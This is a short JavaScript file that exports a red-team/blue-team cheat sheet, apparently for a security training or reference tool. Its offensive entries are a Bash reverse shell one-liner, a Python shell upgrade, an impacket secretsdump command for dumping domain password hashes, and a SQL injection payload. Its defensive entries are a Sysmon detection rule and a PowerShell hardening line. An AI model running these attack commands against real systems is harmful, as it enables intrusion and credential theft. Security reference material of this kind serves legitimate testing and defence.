export const CHEATS = [
  {
    category: "REVERSE SHELLS (RED)",
    code: "bash -i >& /dev/tcp/{TARGET}/{PORT} 0>&1",
    desc: "Standard interactive Bash TCP reverse shell one-liner with parameters."
  },
  {
    category: "DETECTION RULE (BLUE)",
    code: "Sysmon Event ID 3 (Network Connection) AND DestinationPort == {PORT}",
    desc: "Sysmon rule to flag outgoing non-standard TCP connections."
  },
  {
    category: "PYTHON TTY SPAWN (RED)",
    code: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    desc: "Upgrade dumb terminal shell to interactive pseudoterminal."
  },
  {
    category: "ACTIVE DIRECTORY DUMP (RED)",
    code: "impacket-secretsdump domain.local/user:'pass'@{TARGET}",
    desc: "Remotely dump SAM, LSA secrets, and NTDS.dit hashes."
  },
  {
    category: "SQL INJECTION SANITY (RED)",
    code: "' UNION SELECT NULL, @@version, NULL-- -",
    desc: "Generic SQLi UNION test for column alignment & DB version."
  },
  {
    category: "HARDENING COUNTERMEASURE (BLUE)",
    code: "Set-ExecutionPolicy Restricted -Scope LocalMachine; Set-ProcessMitigation -System -Enable DEP",
    desc: "PowerShell baseline system hardening script."
  }
];
